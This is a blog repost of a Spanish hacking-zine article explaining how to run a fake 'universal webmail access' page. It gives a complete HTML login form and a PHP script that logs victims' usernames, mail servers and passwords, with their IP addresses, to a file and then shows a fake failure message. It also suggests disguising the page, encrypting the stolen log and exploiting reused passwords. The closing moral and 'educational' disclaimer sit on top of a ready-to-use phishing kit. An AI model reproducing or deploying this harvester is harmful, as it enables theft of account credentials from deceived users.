---
layout: post
post_id: fakemail
lang: es
title: "DTFzine #2 Fake: Universal Web Mail Access"
description: "Cómo explotar un viejo truco para conseguir nombres de usuario y passwords"
keywords: "email, fake, trucos, seguridad, nombre, usuario, hacking, dtfzine"
comments: false
categories: 
  - dtfzine
---


    Fake: Universal-Web-mail-Access
    DTFzine #2
    Autor: NaTaSaB
    Web: http://www.merlos.org
    e-mail: www.merlos.org

## Introducción

Bueno, en este artículo vamos a explotar un viejo truco para conseguir nombres de usuario y passwords. Ya hace años salió el famoso fake de hotmail. La picaresca consistia en hacer creer al usuario que se encontraba en la página de hotmail.com, cuando en realidad estaba en una copia albergada en el servidor del "jaker" con aspecto idéntico al de la portada de hotmail. Sin embargo nuestra misión en este caso será hacer creer al usuario que puede acceder a cualquier cuenta de correo desde nuestra página. Para ello, implementaremos un pequeño y sencillo script escrito en PHP que hará el trabajo de recolector de información. También necesitamos un formulario que ha de cumplimentar nuestra víctima:

{% highlight html %}

	<------ CuT HERE ----------->

    <form name="form1" method="post" action="mail.php">
    Usuario: 
    <input type="text" name="user" />
    @
    <input type="text" name="server" />
    [Ej: mail@server.com or for pop3 account user @ pop3.server.com]&lt;br/&gt;
    <br />
    Password: 
    <input type="text" name="password" />
    <input type="submit" name="Submit" value="Submit" />
    </form>

<------ End of CUT ---------->
{% endhighlight %}

Este formulario es lo que tendría que pegar dentro del BODY de la página HTML el malintencionado Webmaster. Por otra parte, no estaría de más adornarlo un poquito, con algún slogan impactante al más puro estilo americano o poner algo tipo "Powered by AllWebmails.com" o similar.
	
El código del CGI es el siguiente y ha de estar en un fichero HTML con el nombre mail.php (el que pone en el action del <form>)

{% highlight php %}
	<----- Begin of PHP code ------>

<?php 	
	//Comprobamos q haya metido todos los datos
	if (!$user || !$server || !$password ) 
		die ("Por favor, rellene todos los campos del formulario");

	// Guardamos los datos en un fichero de texto.Además guardamos la fecha e IP.

	$file="info.dat";

	if (!($fp=fopen ($file,"a"))) 
		die ("Ocurrió un fallo al consultar las Bases de Datos.");
	$date=date("D d/M/Y H:i",time());
	$host = gethostbyaddr($REMOTE_ADDR);
	$line=$date ." ". $REMOTE_HOST ." " . $REMOTE_ADDR . 
		" [" . $host . "] " . "$user @ $server $password\n\r";
	fwrite($fp,$line);
	fclose($fp);
	//Por último, decimos q no pudimos acceder al servidor

	echo "&lt;h3&gt;Lo sentimos, pero no pudimos acceder a su cuenta en $server.&gt;/br&gt;&lt;/h3&gt;";
	echo "Asegurese de que introdujo los datos correctos.<BR>";	
	echo "Inténtelo desde la página WEB del servidor. Gracias";
?>
{% endhighlight%}
Si no quieres guardar la información en plain text mira en la librería de funciones mcrypt (mcrypt_encrypt y mcrypt_decrypt) si el server en el q alojas la web tiene habilitado ese modulo. También puedes usar un simple XOR te llega.
 	
Como ya has visto con unas pocas líneas podemos obtener datos comprometidos de un usuario, y nos los habrá dado él. Piensa que que si entramos en su cuenta de correo obtendremos mucha información acerca de ese usuario (nombre, edad, nacionalidad, gustos, aficciones, otros passwords...), incluso podremos conseguir sus datos de conexión, y puede que cuenta corriente, ya que algunos ISP utilizan el mismo password para los datos de conexión y para el e-mail.

Moraleja: Hay que ser cauto a la hora de enviar datos de usuario y passwords por la red, especialmente páginas web ajenas a la propia ya que puede haber espavilados que intenten aprovecharse de nosotros, a veces incautos navegantes, ignorantes de los maliciosos planes de estos desalmados xDDDD

Nota: Este texto se distribuye con fines educativos. El autor no se hace responsable de los usos ilícitos que de esta información se pueda hacer. DTFzine.